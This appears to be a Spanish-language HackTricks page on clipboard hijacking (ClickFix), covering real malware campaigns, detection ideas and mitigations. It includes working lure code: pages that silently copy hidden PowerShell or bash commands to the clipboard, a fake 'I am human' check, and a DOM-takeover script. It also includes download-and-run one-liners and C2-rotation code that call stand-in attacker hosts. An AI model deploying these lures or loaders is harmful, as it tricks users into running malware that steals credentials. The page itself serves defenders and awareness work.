# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – consejo antiguo pero aún válido

## Resumen

Clipboard hijacking – también conocido como *pastejacking* – abusa del hecho de que los usuarios copian y pegan comandos rutinariamente sin inspeccionarlos. Una página web maliciosa (o cualquier contexto con JavaScript como Electron o una aplicación Desktop) coloca programáticamente texto controlado por el atacante en el portapapeles del sistema. A las víctimas se les anima, normalmente mediante instrucciones de social-engineering cuidadosamente elaboradas, a presionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o abrir un terminal y *pegar* el contenido del portapapeles, ejecutando inmediatamente comandos arbitrarios.

Debido a que **no se descarga ningún archivo ni se abre ningún adjunto**, la técnica elude la mayoría de los controles de seguridad de correo y contenido web que monitorizan adjuntos, macros o la ejecución directa de comandos. Por ello el ataque es popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campañas antiguas usaban `document.execCommand('copy')`, las más recientes se basan en la asíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. JavaScript inyectado de **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que almacena silenciosamente un comando de una línea de PowerShell codificado en Base64 en el portapapeles.
3. Las instrucciones HTML le dicen a la víctima: *“Presione **Win + R**, pegue el comando y presione Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej. scheduled task) – finalmente ejecutando NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente las APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) mediante **curl.exe**, los descifra usando una rolling XOR key `"https://google.com/"`, inyecta el shellcode final y extrae **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el JScript downloader dentro de **cscript.exe**
3. Obtiene un MSI payload → deja `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** lanza un script PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos y, finalmente, ejecuta un script `.a3x` que exfiltra credenciales de navegadores a `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con rotating C2 (PureHVNC)

Algunas campañas ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un one‑liner que descarga y ejecuta JavaScript vía WSH, lo persiste y rota el C2 a diario. Cadena observada de ejemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para evadir la inspección casual.
- JavaScript se persiste a sí mismo vía un Startup LNK (WScript/CScript), y selecciona el C2 según el día actual – permitiendo una rápida rotación de dominios.

Fragmento mínimo de JS usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado hardcoded y usando chunking para el tráfico.

Detection ideas specific to this variant
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefactos de inicio: LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` que invoca WScript/CScript con una ruta JS bajo `%TEMP%`/`%APPDATA%`.
- Registro/RunMRU y telemetría de línea de comandos que contienen `.split('').reverse().join('')` o `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` con payloads grandes por stdin para alimentar scripts largos sin líneas de comando extensas.
- Scheduled Tasks que posteriormente ejecutan LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta con aspecto de updater (p. ej., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Nombres de host y URLs de C2 que rotan diariamente con patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escritura al portapapeles seguidos de pegar con Win+R y luego la ejecución inmediata de `powershell.exe`.

Los blue teams pueden combinar telemetría de portapapeles, creación de procesos y del registro para localizar abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de **Win + R** comandos – buscar entradas inusuales en Base64 / ofuscadas.
* Security Event ID **4688** (Creación de procesos) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del sospechoso evento 4688.
* EDR clipboard sensors (si están presentes) – correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campañas recientes producen en masa páginas de verificación falsas de CDN/browser ("Just a moment…", IUAM-style) que coaccionan a los usuarios a copiar comandos específicos del OS desde su portapapeles hacia consolas nativas. Esto pivota la ejecución fuera del sandbox del navegador y funciona en Windows y macOS.

Key traits of the builder-generated pages
- Detección del OS vía `navigator.userAgent` para personalizar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionales para OS no soportados para mantener la ilusión.
- Copiado automático al portapapeles en acciones benignas de UI (checkbox/Copy) mientras el texto visible puede diferir del contenido del portapapeles.
- Bloqueo móvil y un popover con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Ofuscación opcional e injector de un solo archivo para sobrescribir el DOM de un sitio comprometido con una UI de verificación con estilo Tailwind (no se requiere registrar un nuevo dominio).

Ejemplo: desajuste del portapapeles + ramificación dependiente del OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencia en macOS de la ejecución inicial
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar la terminal, reduciendo artefactos visibles.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Páginas que enlazan Clipboard API a widgets de verificación; discrepancia entre el texto mostrado y la payload del portapapeles; `navigator.userAgent` branching; Tailwind + reemplazo de página única en contextos sospechosos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- macOS endpoint: Terminal/iTerm que lanza `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; trabajos en background que sobreviven al cierre del terminal.
- Correlacionar el historial `RunMRU` de Win+R y las escrituras en el portapapeles con la creación posterior de procesos de consola.

Véase también (técnicas de apoyo)

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir un gesto del usuario.
2. Security awareness – enseñar a los usuarios a *escribir* comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrarios.
4. Network controls – bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.

## Related Tricks

* **Discord Invite Hijacking** a menudo abusa del mismo enfoque ClickFix después de atraer a los usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
